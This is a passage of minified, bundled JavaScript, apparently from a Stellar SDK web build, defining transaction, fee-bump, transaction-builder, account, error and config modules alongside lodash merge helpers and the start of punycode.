                throw new Error("Transaction is immutable")
            }
        }, {
            key: "memo",
            get: function() {
                return Y.Memo.fromXDRObject(this._memo)
            },
            set: function(fe) {
                throw new Error("Transaction is immutable")
            }
        }]),
        oe
    }(F.TransactionBase),
    transaction$1
}
var fee_bump_transaction$1 = {}, hasRequiredFee_bump_transaction$1;
function requireFee_bump_transaction$1() {
    if (hasRequiredFee_bump_transaction$1)
        return fee_bump_transaction$1;
    hasRequiredFee_bump_transaction$1 = 1,
    Object.defineProperty(fee_bump_transaction$1, "__esModule", {
        value: !0
    }),
    fee_bump_transaction$1.FeeBumpTransaction = void 0;
    var _ = function() {
        function K(Q, ee) {
            for (var ae = 0; ae < ee.length; ae++) {
                var ne = ee[ae];
                ne.enumerable = ne.enumerable || !1,
                ne.configurable = !0,
                "value"in ne && (ne.writable = !0),
                Object.defineProperty(Q, ne.key, ne)
            }
        }
        return function(Q, ee, ae) {
            return ee && K(Q.prototype, ee),
            ae && K(Q, ae),
            Q
        }
    }()
      , M = requireStellarXdr_generated()
      , j = X(M)
      , O = requireHashing$1()
      , x = requireTransaction$1()
      , w = requireTransaction_base$1()
      , b = requireDecode_encode_muxed_account$1();
    function X(K) {
        return K && K.__esModule ? K : {
            default: K
        }
    }
    function Y(K, Q) {
        if (!(K instanceof Q))
            throw new TypeError("Cannot call a class as a function")
    }
    function F(K, Q) {
        if (!K)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return Q && (typeof Q == "object" || typeof Q == "function") ? Q : K
    }
    function V(K, Q) {
        if (typeof Q != "function" && Q !== null)
            throw new TypeError("Super expression must either be null or a function, not " + typeof Q);
        K.prototype = Object.create(Q && Q.prototype, {
            constructor: {
                value: K,
                enumerable: !1,
                writable: !0,
                configurable: !0
            }
        }),
        Q && (Object.setPrototypeOf ? Object.setPrototypeOf(K, Q) : K.__proto__ = Q)
    }
    return fee_bump_transaction$1.FeeBumpTransaction = function(K) {
        V(Q, K);
        function Q(ee, ae, ne) {
            if (Y(this, Q),
            typeof ee == "string") {
                var oe = Buffer.from(ee, "base64");
                ee = j.default.TransactionEnvelope.fromXDR(oe)
            }
            var ue = ee.switch();
            if (ue !== j.default.EnvelopeType.envelopeTypeTxFeeBump())
                throw new Error("Invalid TransactionEnvelope: expected an envelopeTypeTxFeeBump but received an " + ue.name + ".");
            var fe = ee.value()
              , he = fe.tx()
              , pe = he.fee().toString()
              , ye = (fe.signatures() || []).slice()
              , be = F(this, (Q.__proto__ || Object.getPrototypeOf(Q)).call(this, he, ye, pe, ae))
              , xe = j.default.TransactionEnvelope.envelopeTypeTx(he.innerTx().v1());
            return be._feeSource = (0,
            b.encodeMuxedAccountToAddress)(be.tx.feeSource(), ne),
            be._innerTransaction = new x.Transaction(xe,ae),
            be
        }
        return _(Q, [{
            key: "signatureBase",
            value: function() {
                var ae = new j.default.TransactionSignaturePayloadTaggedTransaction.envelopeTypeTxFeeBump(this.tx)
                  , ne = new j.default.TransactionSignaturePayload({
                    networkId: j.default.Hash.fromXDR((0,
                    O.hash)(this.networkPassphrase)),
                    taggedTransaction: ae
                });
                return ne.toXDR()
            }
        }, {
            key: "toEnvelope",
            value: function() {
                var ae = new j.default.FeeBumpTransactionEnvelope({
                    tx: j.default.FeeBumpTransaction.fromXDR(this.tx.toXDR()),
                    signatures: this.signatures.slice()
                });
                return new j.default.TransactionEnvelope.envelopeTypeTxFeeBump(ae)
            }
        }, {
            key: "innerTransaction",
            get: function() {
                return this._innerTransaction
            }
        }, {
            key: "feeSource",
            get: function() {
                return this._feeSource
            }
        }]),
        Q
    }(w.TransactionBase),
    fee_bump_transaction$1
}
var transaction_builder$1 = {}, hasRequiredTransaction_builder$1;
function requireTransaction_builder$1() {
    if (hasRequiredTransaction_builder$1)
        return transaction_builder$1;
    hasRequiredTransaction_builder$1 = 1,
    Object.defineProperty(transaction_builder$1, "__esModule", {
        value: !0
    }),
    transaction_builder$1.TransactionBuilder = transaction_builder$1.TimeoutInfinite = transaction_builder$1.BASE_FEE = void 0;
    var _ = function() {
        function pe(ye, be) {
            for (var xe = 0; xe < be.length; xe++) {
                var Ae = be[xe];
                Ae.enumerable = Ae.enumerable || !1,
                Ae.configurable = !0,
                "value"in Ae && (Ae.writable = !0),
                Object.defineProperty(ye, Ae.key, Ae)
            }
        }
        return function(ye, be, xe) {
            return be && pe(ye.prototype, be),
            xe && pe(ye, xe),
            ye
        }
    }();
    transaction_builder$1.isValidDate = he;
    var M = requireLib$4()
      , j = requireBignumber$2()
      , O = oe(j)
      , x = requireClone()
      , w = oe(x)
      , b = requireIsUndefined()
      , X = oe(b)
      , Y = requireIsString()
      , F = oe(Y)
      , V = requireStellarXdr_generated()
      , K = oe(V)
      , Q = requireTransaction$1()
      , ee = requireFee_bump_transaction$1()
      , ae = requireMemo$1()
      , ne = requireDecode_encode_muxed_account$1();
    function oe(pe) {
        return pe && pe.__esModule ? pe : {
            default: pe
        }
    }
    function ue(pe, ye) {
        if (!(pe instanceof ye))
            throw new TypeError("Cannot call a class as a function")
    }
    var fe = transaction_builder$1.BASE_FEE = "100";
    transaction_builder$1.TimeoutInfinite = 0,
    transaction_builder$1.TransactionBuilder = function() {
        function pe(ye) {
            var be = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
            if (ue(this, pe),
            !ye)
                throw new Error("must specify source account for the transaction");
            if ((0,
            X.default)(be.fee))
                throw new Error("must specify fee for the transaction (in stroops)");
            this.source = ye,
            this.operations = [],
            this.baseFee = (0,
            X.default)(be.fee) ? fe : be.fee,
            this.timebounds = (0,
            w.default)(be.timebounds) || null,
            this.memo = be.memo || ae.Memo.none(),
            this.networkPassphrase = be.networkPassphrase || null,
            this.supportMuxedAccounts = be.withMuxing || !1
        }
        return _(pe, [{
            key: "addOperation",
            value: function(be) {
                return this.operations.push(be),
                this
            }
        }, {
            key: "addMemo",
            value: function(be) {
                return this.memo = be,
                this
            }
        }, {
            key: "setTimeout",
            value: function(be) {
                if (this.timebounds !== null && this.timebounds.maxTime > 0)
                    throw new Error("TimeBounds.max_time has been already set - setting timeout would overwrite it.");
                if (be < 0)
                    throw new Error("timeout cannot be negative");
                if (be > 0) {
                    var xe = Math.floor(Date.now() / 1e3) + be;
                    this.timebounds === null ? this.timebounds = {
                        minTime: 0,
                        maxTime: xe
                    } : this.timebounds = {
                        minTime: this.timebounds.minTime,
                        maxTime: xe
                    }
                } else
                    this.timebounds = {
                        minTime: 0,
                        maxTime: 0
                    };
                return this
            }
        }, {
            key: "setNetworkPassphrase",
            value: function(be) {
                return this.networkPassphrase = be,
                this
            }
        }, {
            key: "enableMuxedAccounts",
            value: function() {
                return this.supportMuxedAccounts = !0,
                this
            }
        }, {
            key: "build",
            value: function() {
                var be = new O.default(this.source.sequenceNumber()).add(1)
                  , xe = new O.default(this.baseFee).mul(this.operations.length).toNumber()
                  , Ae = {
                    fee: xe,
                    seqNum: K.default.SequenceNumber.fromString(be.toString()),
                    memo: this.memo ? this.memo.toXDRObject() : null
                };
                if (this.timebounds === null || typeof this.timebounds.minTime > "u" || typeof this.timebounds.maxTime > "u")
                    throw new Error("TimeBounds has to be set or you must call setTimeout(TimeoutInfinite).");
                he(this.timebounds.minTime) && (this.timebounds.minTime = this.timebounds.minTime.getTime() / 1e3),
                he(this.timebounds.maxTime) && (this.timebounds.maxTime = this.timebounds.maxTime.getTime() / 1e3),
                this.timebounds.minTime = M.UnsignedHyper.fromString(this.timebounds.minTime.toString()),
                this.timebounds.maxTime = M.UnsignedHyper.fromString(this.timebounds.maxTime.toString()),
                Ae.timeBounds = new K.default.TimeBounds(this.timebounds),
                Ae.sourceAccount = (0,
                ne.decodeAddressToMuxedAccount)(this.source.accountId(), this.supportMuxedAccounts),
                Ae.ext = new K.default.TransactionExt(0);
                var Ee = new K.default.Transaction(Ae);
                Ee.operations(this.operations);
                var Be = new K.default.TransactionEnvelope.envelopeTypeTx(new K.default.TransactionV1Envelope({
                    tx: Ee
                }))
                  , ce = new Q.Transaction(Be,this.networkPassphrase,this.supportMuxedAccounts);
                return this.source.incrementSequenceNumber(),
                ce
            }
        }], [{
            key: "buildFeeBumpTransaction",
            value: function(be, xe, Ae, Ee, Be) {
                var ce = Ae.operations.length
                  , q = new O.default(Ae.fee).div(ce)
                  , L = new O.default(xe);
                if (L.lessThan(q))
                    throw new Error("Invalid baseFee, it should be at least " + q + " stroops.");
                var U = new O.default(fe);
                if (L.lessThan(U))
                    throw new Error("Invalid baseFee, it should be at least " + U + " stroops.");
                var Z = Ae.toEnvelope();
                if (Z.switch() === K.default.EnvelopeType.envelopeTypeTxV0()) {
                    var te = Z.v0().tx()
                      , se = new K.default.Transaction({
                        sourceAccount: new K.default.MuxedAccount.keyTypeEd25519(te.sourceAccountEd25519()),
                        fee: te.fee(),
                        seqNum: te.seqNum(),
                        timeBounds: te.timeBounds(),
                        memo: te.memo(),
                        operations: te.operations(),
                        ext: new K.default.TransactionExt(0)
                    });
                    Z = new K.default.TransactionEnvelope.envelopeTypeTx(new K.default.TransactionV1Envelope({
                        tx: se,
                        signatures: Z.v0().signatures()
                    }))
                }
                var de = void 0;
                (0,
                F.default)(be) ? de = (0,
                ne.decodeAddressToMuxedAccount)(be, Be) : de = be.xdrMuxedAccount();
                var re = new K.default.FeeBumpTransaction({
                    feeSource: de,
                    fee: K.default.Int64.fromString(L.mul(ce + 1).toString()),
                    innerTx: K.default.FeeBumpTransactionInnerTx.envelopeTypeTx(Z.v1()),
                    ext: new K.default.FeeBumpTransactionExt(0)
                })
                  , $ = new K.default.FeeBumpTransactionEnvelope({
                    tx: re,
                    signatures: []
                })
                  , ie = new K.default.TransactionEnvelope.envelopeTypeTxFeeBump($);
                return new ee.FeeBumpTransaction(ie,Ee,Be)
            }
        }, {
            key: "fromXDR",
            value: function(be, xe, Ae) {
                return typeof be == "string" && (be = K.default.TransactionEnvelope.fromXDR(be, "base64")),
                be.switch() === K.default.EnvelopeType.envelopeTypeTxFeeBump() ? new ee.FeeBumpTransaction(be,xe,Ae) : new Q.Transaction(be,xe,Ae)
            }
        }]),
        pe
    }();
    function he(pe) {
        return pe instanceof Date && !isNaN(pe)
    }
    return transaction_builder$1
}
var account$1 = {}, hasRequiredAccount$1;
function requireAccount$1() {
    if (hasRequiredAccount$1)
        return account$1;
    hasRequiredAccount$1 = 1,
    Object.defineProperty(account$1, "__esModule", {
        value: !0
    }),
    account$1.MuxedAccount = account$1.Account = void 0;
    var _ = function() {
        function ee(ae, ne) {
            for (var oe = 0; oe < ne.length; oe++) {
                var ue = ne[oe];
                ue.enumerable = ue.enumerable || !1,
                ue.configurable = !0,
                "value"in ue && (ue.writable = !0),
                Object.defineProperty(ae, ue.key, ue)
            }
        }
        return function(ae, ne, oe) {
            return ne && ee(ae.prototype, ne),
            oe && ee(ae, oe),
            ae
        }
    }()
      , M = requireIsString()
      , j = F(M)
      , O = requireBignumber$2()
      , x = F(O)
      , w = requireStellarXdr_generated()
      , b = F(w)
      , X = requireStrkey$1()
      , Y = requireDecode_encode_muxed_account$1();
    function F(ee) {
        return ee && ee.__esModule ? ee : {
            default: ee
        }
    }
    function V(ee, ae) {
        if (!(ee instanceof ae))
            throw new TypeError("Cannot call a class as a function")
    }
    var K = account$1.Account = function() {
        function ee(ae, ne) {
            if (V(this, ee),
            X.StrKey.isValidMed25519PublicKey(ae))
                throw new Error("accountId is an M-address; use MuxedAccount instead");
            if (!X.StrKey.isValidEd25519PublicKey(ae))
                throw new Error("accountId is invalid");
            if (!(0,
            j.default)(ne))
                throw new Error("sequence must be of type string");
            this._accountId = ae,
            this.sequence = new x.default(ne)
        }
        return _(ee, [{
            key: "accountId",
            value: function() {
                return this._accountId
            }
        }, {
            key: "sequenceNumber",
            value: function() {
                return this.sequence.toString()
            }
        }, {
            key: "incrementSequenceNumber",
            value: function() {
                this.sequence = this.sequence.add(1)
            }
        }, {
            key: "createSubaccount",
            value: function(ne) {
                return new Q(this,ne)
            }
        }]),
        ee
    }()
      , Q = account$1.MuxedAccount = function() {
        function ee(ae, ne) {
            V(this, ee);
            var oe = ae.accountId();
            if (!X.StrKey.isValidEd25519PublicKey(oe))
                throw new Error("accountId is invalid");
            this.account = ae,
            this._muxedXdr = (0,
            Y.encodeMuxedAccount)(oe, ne),
            this._mAddress = (0,
            Y.encodeMuxedAccountToAddress)(this._muxedXdr, !0),
            this._id = ne
        }
        return _(ee, [{
            key: "baseAccount",
            value: function() {
                return this.account
            }
        }, {
            key: "accountId",
            value: function() {
                return this._mAddress
            }
        }, {
            key: "id",
            value: function() {
                return this._id
            }
        }, {
            key: "setId",
            value: function(ne) {
                if (!(0,
                j.default)(ne))
                    throw new Error("id should be a string representing a number (uint64)");
                return this._muxedXdr.med25519().id(b.default.Uint64.fromString(ne)),
                this._mAddress = (0,
                Y.encodeMuxedAccountToAddress)(this._muxedXdr, !0),
                this._id = ne,
                this
            }
        }, {
            key: "sequenceNumber",
            value: function() {
                return this.account.sequenceNumber()
            }
        }, {
            key: "incrementSequenceNumber",
            value: function() {
                return this.account.incrementSequenceNumber()
            }
        }, {
            key: "createSubaccount",
            value: function(ne) {
                return new ee(this.account,ne)
            }
        }, {
            key: "toXDRObject",
            value: function() {
                return this._muxedXdr
            }
        }, {
            key: "equals",
            value: function(ne) {
                return this.accountId() === ne.accountId()
            }
        }], [{
            key: "fromAddress",
            value: function(ne, oe) {
                var ue = (0,
                Y.decodeAddressToMuxedAccount)(ne, !0)
                  , fe = (0,
                Y.encodeMuxedAccountToAddress)(ue, !1)
                  , he = ue.med25519().id().toString();
                return new ee(new K(fe,oe),he)
            }
        }]),
        ee
    }();
    return account$1
}
var network$1 = {}, hasRequiredNetwork$1;
function requireNetwork$1() {
    return hasRequiredNetwork$1 || (hasRequiredNetwork$1 = 1,
    Object.defineProperty(network$1, "__esModule", {
        value: !0
    }),
    network$1.Networks = {
        PUBLIC: "Public Global Stellar Network ; September 2015",
        TESTNET: "Test SDF Network ; September 2015"
    }),
    network$1
}
var hasRequiredLib$3;
function requireLib$3() {
    return hasRequiredLib$3 || (hasRequiredLib$3 = 1,
    function(_, M) {
        Object.defineProperty(M, "__esModule", {
            value: !0
        }),
        M.encodeMuxedAccount = M.encodeMuxedAccountToAddress = M.decodeAddressToMuxedAccount = M.StrKey = M.Networks = M.Claimant = M.MuxedAccount = M.Account = M.AuthClawbackEnabledFlag = M.AuthImmutableFlag = M.AuthRevocableFlag = M.AuthRequiredFlag = M.Operation = M.LiquidityPoolId = M.LiquidityPoolAsset = M.Asset = M.BASE_FEE = M.TimeoutInfinite = M.TransactionBuilder = M.FeeBumpTransaction = M.Transaction = M.TransactionBase = M.Hyper = M.UnsignedHyper = M.Keypair = M.LiquidityPoolFeeV18 = M.getLiquidityPoolId = M.FastSigning = M.verify = M.sign = M.hash = M.xdr = void 0;
        var j = requireHashing$1();
        Object.defineProperty(M, "hash", {
            enumerable: !0,
            get: function() {
                return j.hash
            }
        });
        var O = requireSigning$1();
        Object.defineProperty(M, "sign", {
            enumerable: !0,
            get: function() {
                return O.sign
            }
        }),
        Object.defineProperty(M, "verify", {
            enumerable: !0,
            get: function() {
                return O.verify
            }
        }),
        Object.defineProperty(M, "FastSigning", {
            enumerable: !0,
            get: function() {
                return O.FastSigning
            }
        });
        var x = requireGet_liquidity_pool_id$1();
        Object.defineProperty(M, "getLiquidityPoolId", {
            enumerable: !0,
            get: function() {
                return x.getLiquidityPoolId
            }
        }),
        Object.defineProperty(M, "LiquidityPoolFeeV18", {
            enumerable: !0,
            get: function() {
                return x.LiquidityPoolFeeV18
            }
        });
        var w = requireKeypair$1();
        Object.defineProperty(M, "Keypair", {
            enumerable: !0,
            get: function() {
                return w.Keypair
            }
        });
        var b = requireLib$4();
        Object.defineProperty(M, "UnsignedHyper", {
            enumerable: !0,
            get: function() {
                return b.UnsignedHyper
            }
        }),
        Object.defineProperty(M, "Hyper", {
            enumerable: !0,
            get: function() {
                return b.Hyper
            }
        });
        var X = requireTransaction_base$1();
        Object.defineProperty(M, "TransactionBase", {
            enumerable: !0,
            get: function() {
                return X.TransactionBase
            }
        });
        var Y = requireTransaction$1();
        Object.defineProperty(M, "Transaction", {
            enumerable: !0,
            get: function() {
                return Y.Transaction
            }
        });
        var F = requireFee_bump_transaction$1();
        Object.defineProperty(M, "FeeBumpTransaction", {
            enumerable: !0,
            get: function() {
                return F.FeeBumpTransaction
            }
        });
        var V = requireTransaction_builder$1();
        Object.defineProperty(M, "TransactionBuilder", {
            enumerable: !0,
            get: function() {
                return V.TransactionBuilder
            }
        }),
        Object.defineProperty(M, "TimeoutInfinite", {
            enumerable: !0,
            get: function() {
                return V.TimeoutInfinite
            }
        }),
        Object.defineProperty(M, "BASE_FEE", {
            enumerable: !0,
            get: function() {
                return V.BASE_FEE
            }
        });
        var K = requireAsset$1();
        Object.defineProperty(M, "Asset", {
            enumerable: !0,
            get: function() {
                return K.Asset
            }
        });
        var Q = requireLiquidity_pool_asset$1();
        Object.defineProperty(M, "LiquidityPoolAsset", {
            enumerable: !0,
            get: function() {
                return Q.LiquidityPoolAsset
            }
        });
        var ee = requireLiquidity_pool_id$1();
        Object.defineProperty(M, "LiquidityPoolId", {
            enumerable: !0,
            get: function() {
                return ee.LiquidityPoolId
            }
        });
        var ae = requireOperation$1();
        Object.defineProperty(M, "Operation", {
            enumerable: !0,
            get: function() {
                return ae.Operation
            }
        }),
        Object.defineProperty(M, "AuthRequiredFlag", {
            enumerable: !0,
            get: function() {
                return ae.AuthRequiredFlag
            }
        }),
        Object.defineProperty(M, "AuthRevocableFlag", {
            enumerable: !0,
            get: function() {
                return ae.AuthRevocableFlag
            }
        }),
        Object.defineProperty(M, "AuthImmutableFlag", {
            enumerable: !0,
            get: function() {
                return ae.AuthImmutableFlag
            }
        }),
        Object.defineProperty(M, "AuthClawbackEnabledFlag", {
            enumerable: !0,
            get: function() {
                return ae.AuthClawbackEnabledFlag
            }
        });
        var ne = requireMemo$1();
        Object.keys(ne).forEach(function(Ae) {
            Ae === "default" || Ae === "__esModule" || Object.defineProperty(M, Ae, {
                enumerable: !0,
                get: function() {
                    return ne[Ae]
                }
            })
        });
        var oe = requireAccount$1();
        Object.defineProperty(M, "Account", {
            enumerable: !0,
            get: function() {
                return oe.Account
            }
        }),
        Object.defineProperty(M, "MuxedAccount", {
            enumerable: !0,
            get: function() {
                return oe.MuxedAccount
            }
        });
        var ue = requireClaimant$1();
        Object.defineProperty(M, "Claimant", {
            enumerable: !0,
            get: function() {
                return ue.Claimant
            }
        });
        var fe = requireNetwork$1();
        Object.defineProperty(M, "Networks", {
            enumerable: !0,
            get: function() {
                return fe.Networks
            }
        });
        var he = requireStrkey$1();
        Object.defineProperty(M, "StrKey", {
            enumerable: !0,
            get: function() {
                return he.StrKey
            }
        });
        var pe = requireDecode_encode_muxed_account$1();
        Object.defineProperty(M, "decodeAddressToMuxedAccount", {
            enumerable: !0,
            get: function() {
                return pe.decodeAddressToMuxedAccount
            }
        }),
        Object.defineProperty(M, "encodeMuxedAccountToAddress", {
            enumerable: !0,
            get: function() {
                return pe.encodeMuxedAccountToAddress
            }
        }),
        Object.defineProperty(M, "encodeMuxedAccount", {
            enumerable: !0,
            get: function() {
                return pe.encodeMuxedAccount
            }
        });
        var ye = requireStellarXdr_generated()
          , be = xe(ye);
        function xe(Ae) {
            return Ae && Ae.__esModule ? Ae : {
                default: Ae
            }
        }
        M.xdr = be.default,
        M.default = _.exports
    }(lib$3, lib$3.exports)),
    lib$3.exports
}
var hasRequiredAccount_response;
function requireAccount_response() {
    if (hasRequiredAccount_response)
        return account_response;
    hasRequiredAccount_response = 1,
    Object.defineProperty(account_response, "__esModule", {
        value: !0
    }),
    account_response.AccountResponse = void 0;
    var _ = require$$0$2
      , M = _.__importDefault(requireForIn())
      , j = requireLib$3()
      , O = function() {
        function x(w) {
            var b = this;
            this._baseAccount = new j.Account(w.account_id,w.sequence),
            M.default(w, function(X, Y) {
                b[Y] = X
            })
        }
        return x.prototype.accountId = function() {
            return this._baseAccount.accountId()
        }
        ,
        x.prototype.sequenceNumber = function() {
            return this._baseAccount.sequenceNumber()
        }
        ,
        x.prototype.incrementSequenceNumber = function() {
            this._baseAccount.incrementSequenceNumber(),
            this.sequence = this._baseAccount.sequenceNumber()
        }
        ,
        x.prototype.createSubaccount = function(w) {
            return this._baseAccount.createSubaccount(w)
        }
        ,
        x
    }();
    return account_response.AccountResponse = O,
    account_response
}
var errors$1 = {}, hasRequiredErrors$1;
function requireErrors$1() {
    if (hasRequiredErrors$1)
        return errors$1;
    hasRequiredErrors$1 = 1,
    Object.defineProperty(errors$1, "__esModule", {
        value: !0
    }),
    errors$1.AccountRequiresMemoError = errors$1.InvalidSep10ChallengeError = errors$1.BadResponseError = errors$1.BadRequestError = errors$1.NotFoundError = errors$1.NetworkError = void 0;
    var _ = require$$0$2
      , M = function(X) {
        _.__extends(Y, X);
        function Y(F, V) {
            var K = this.constructor
              , Q = this
              , ee = K.prototype;
            return Q = X.call(this, F) || this,
            Q.__proto__ = ee,
            Q.constructor = Y,
            Q.response = V,
            Q
        }
        return Y.prototype.getResponse = function() {
            return this.response
        }
        ,
        Y
    }(Error);
    errors$1.NetworkError = M;
    var j = function(X) {
        _.__extends(Y, X);
        function Y(F, V) {
            var K = this.constructor
              , Q = this
              , ee = K.prototype;
            return Q = X.call(this, F, V) || this,
            Q.__proto__ = ee,
            Q.constructor = Y,
            Q.name = "NotFoundError",
            Q
        }
        return Y
    }(M);
    errors$1.NotFoundError = j;
    var O = function(X) {
        _.__extends(Y, X);
        function Y(F, V) {
            var K = this.constructor
              , Q = this
              , ee = K.prototype;
            return Q = X.call(this, F, V) || this,
            Q.__proto__ = ee,
            Q.constructor = Y,
            Q.name = "BadRequestError",
            Q
        }
        return Y
    }(M);
    errors$1.BadRequestError = O;
    var x = function(X) {
        _.__extends(Y, X);
        function Y(F, V) {
            var K = this.constructor
              , Q = this
              , ee = K.prototype;
            return Q = X.call(this, F, V) || this,
            Q.__proto__ = ee,
            Q.constructor = Y,
            Q.name = "BadResponseError",
            Q
        }
        return Y
    }(M);
    errors$1.BadResponseError = x;
    var w = function(X) {
        _.__extends(Y, X);
        function Y(F) {
            var V = this.constructor
              , K = this
              , Q = V.prototype;
            return K = X.call(this, F) || this,
            K.__proto__ = Q,
            K.constructor = Y,
            K.name = "InvalidSep10ChallengeError",
            K
        }
        return Y
    }(Error);
    errors$1.InvalidSep10ChallengeError = w;
    var b = function(X) {
        _.__extends(Y, X);
        function Y(F, V, K) {
            var Q = this.constructor
              , ee = this
              , ae = Q.prototype;
            return ee = X.call(this, F) || this,
            ee.__proto__ = ae,
            ee.constructor = Y,
            ee.name = "AccountRequiresMemoError",
            ee.accountId = V,
            ee.operationIndex = K,
            ee
        }
        return Y
    }(Error);
    return errors$1.AccountRequiresMemoError = b,
    errors$1
}
var config = {}, hasRequiredConfig;
function requireConfig() {
    if (hasRequiredConfig)
        return config;
    hasRequiredConfig = 1,
    Object.defineProperty(config, "__esModule", {
        value: !0
    }),
    config.Config = void 0;
    var _ = require$$0$2
      , M = _.__importDefault(requireClone())
      , j = {
        allowHttp: !1,
        timeout: 0
    }
      , O = M.default(j)
      , x = function() {
        function w() {}
        return w.setAllowHttp = function(b) {
            O.allowHttp = b
        }
        ,
        w.setTimeout = function(b) {
            O.timeout = b
        }
        ,
        w.isAllowHttp = function() {
            return O.allowHttp
        }
        ,
        w.getTimeout = function() {
            return O.timeout
        }
        ,
        w.setDefault = function() {
            O = Object.assign({}, j)
        }
        ,
        w
    }();
    return config.Config = x,
    config
}
var server$2 = {}, isEmpty_1, hasRequiredIsEmpty;
function requireIsEmpty() {
    if (hasRequiredIsEmpty)
        return isEmpty_1;
    hasRequiredIsEmpty = 1;
    var _ = require_baseKeys()
      , M = require_getTag()
      , j = requireIsArguments$1()
      , O = requireIsArray()
      , x = requireIsArrayLike()
      , w = requireIsBuffer()
      , b = require_isPrototype()
      , X = requireIsTypedArray()
      , Y = "[object Map]"
      , F = "[object Set]"
      , V = Object.prototype
      , K = V.hasOwnProperty;
    function Q(ee) {
        if (ee == null)
            return !0;
        if (x(ee) && (O(ee) || typeof ee == "string" || typeof ee.splice == "function" || w(ee) || X(ee) || j(ee)))
            return !ee.length;
        var ae = M(ee);
        if (ae == Y || ae == F)
            return !ee.size;
        if (b(ee))
            return !_(ee).length;
        for (var ne in ee)
            if (K.call(ee, ne))
                return !1;
        return !0
    }
    return isEmpty_1 = Q,
    isEmpty_1
}
var _assignMergeValue, hasRequired_assignMergeValue;
function require_assignMergeValue() {
    if (hasRequired_assignMergeValue)
        return _assignMergeValue;
    hasRequired_assignMergeValue = 1;
    var _ = require_baseAssignValue()
      , M = requireEq();
    function j(O, x, w) {
        (w !== void 0 && !M(O[x], w) || w === void 0 && !(x in O)) && _(O, x, w)
    }
    return _assignMergeValue = j,
    _assignMergeValue
}
var isArrayLikeObject_1, hasRequiredIsArrayLikeObject;
function requireIsArrayLikeObject() {
    if (hasRequiredIsArrayLikeObject)
        return isArrayLikeObject_1;
    hasRequiredIsArrayLikeObject = 1;
    var _ = requireIsArrayLike()
      , M = requireIsObjectLike();
    function j(O) {
        return M(O) && _(O)
    }
    return isArrayLikeObject_1 = j,
    isArrayLikeObject_1
}
var isPlainObject_1, hasRequiredIsPlainObject;
function requireIsPlainObject() {
    if (hasRequiredIsPlainObject)
        return isPlainObject_1;
    hasRequiredIsPlainObject = 1;
    var _ = require_baseGetTag()
      , M = require_getPrototype()
      , j = requireIsObjectLike()
      , O = "[object Object]"
      , x = Function.prototype
      , w = Object.prototype
      , b = x.toString
      , X = w.hasOwnProperty
      , Y = b.call(Object);
    function F(V) {
        if (!j(V) || _(V) != O)
            return !1;
        var K = M(V);
        if (K === null)
            return !0;
        var Q = X.call(K, "constructor") && K.constructor;
        return typeof Q == "function" && Q instanceof Q && b.call(Q) == Y
    }
    return isPlainObject_1 = F,
    isPlainObject_1
}
var _safeGet, hasRequired_safeGet;
function require_safeGet() {
    if (hasRequired_safeGet)
        return _safeGet;
    hasRequired_safeGet = 1;
    function _(M, j) {
        if (!(j === "constructor" && typeof M[j] == "function") && j != "__proto__")
            return M[j]
    }
    return _safeGet = _,
    _safeGet
}
var toPlainObject_1, hasRequiredToPlainObject;
function requireToPlainObject() {
    if (hasRequiredToPlainObject)
        return toPlainObject_1;
    hasRequiredToPlainObject = 1;
    var _ = require_copyObject()
      , M = requireKeysIn();
    function j(O) {
        return _(O, M(O))
    }
    return toPlainObject_1 = j,
    toPlainObject_1
}
var _baseMergeDeep, hasRequired_baseMergeDeep;
function require_baseMergeDeep() {
    if (hasRequired_baseMergeDeep)
        return _baseMergeDeep;
    hasRequired_baseMergeDeep = 1;
    var _ = require_assignMergeValue()
      , M = require_cloneBuffer()
      , j = require_cloneTypedArray()
      , O = require_copyArray()
      , x = require_initCloneObject()
      , w = requireIsArguments$1()
      , b = requireIsArray()
      , X = requireIsArrayLikeObject()
      , Y = requireIsBuffer()
      , F = requireIsFunction()
      , V = requireIsObject()
      , K = requireIsPlainObject()
      , Q = requireIsTypedArray()
      , ee = require_safeGet()
      , ae = requireToPlainObject();
    function ne(oe, ue, fe, he, pe, ye, be) {
        var xe = ee(oe, fe)
          , Ae = ee(ue, fe)
          , Ee = be.get(Ae);
        if (Ee) {
            _(oe, fe, Ee);
            return
        }
        var Be = ye ? ye(xe, Ae, fe + "", oe, ue, be) : void 0
          , ce = Be === void 0;
        if (ce) {
            var q = b(Ae)
              , L = !q && Y(Ae)
              , U = !q && !L && Q(Ae);
            Be = Ae,
            q || L || U ? b(xe) ? Be = xe : X(xe) ? Be = O(xe) : L ? (ce = !1,
            Be = M(Ae, !0)) : U ? (ce = !1,
            Be = j(Ae, !0)) : Be = [] : K(Ae) || w(Ae) ? (Be = xe,
            w(xe) ? Be = ae(xe) : (!V(xe) || F(xe)) && (Be = x(Ae))) : ce = !1
        }
        ce && (be.set(Ae, Be),
        pe(Be, Ae, he, ye, be),
        be.delete(Ae)),
        _(oe, fe, Be)
    }
    return _baseMergeDeep = ne,
    _baseMergeDeep
}
var _baseMerge, hasRequired_baseMerge;
function require_baseMerge() {
    if (hasRequired_baseMerge)
        return _baseMerge;
    hasRequired_baseMerge = 1;
    var _ = require_Stack()
      , M = require_assignMergeValue()
      , j = require_baseFor()
      , O = require_baseMergeDeep()
      , x = requireIsObject()
      , w = requireKeysIn()
      , b = require_safeGet();
    function X(Y, F, V, K, Q) {
        Y !== F && j(F, function(ee, ae) {
            if (Q || (Q = new _),
            x(ee))
                O(Y, F, ae, V, X, K, Q);
            else {
                var ne = K ? K(b(Y, ae), ee, ae + "", Y, F, Q) : void 0;
                ne === void 0 && (ne = ee),
                M(Y, ae, ne)
            }
        }, w)
    }
    return _baseMerge = X,
    _baseMerge
}
var merge_1, hasRequiredMerge;
function requireMerge() {
    if (hasRequiredMerge)
        return merge_1;
    hasRequiredMerge = 1;
    var _ = require_baseMerge()
      , M = require_createAssigner()
      , j = M(function(O, x, w) {
        _(O, x, w)
    });
    return merge_1 = j,
    merge_1
}
var URI$1 = {
    exports: {}
}
  , punycode$4 = {
    exports: {}
};
/*! https://mths.be/punycode v1.4.0 by @mathias */
var punycode$3 = punycode$4.exports, hasRequiredPunycode$1;
function requirePunycode$1() {
    return hasRequiredPunycode$1 || (hasRequiredPunycode$1 = 1,
    function(_, M) {
        (function(j) {
            var O = M && !M.nodeType && M
              , x = _ && !_.nodeType && _
              , w = typeof window == "object" && window;
            (w.global === w || w.window === w || w.self === w) && (j = w);
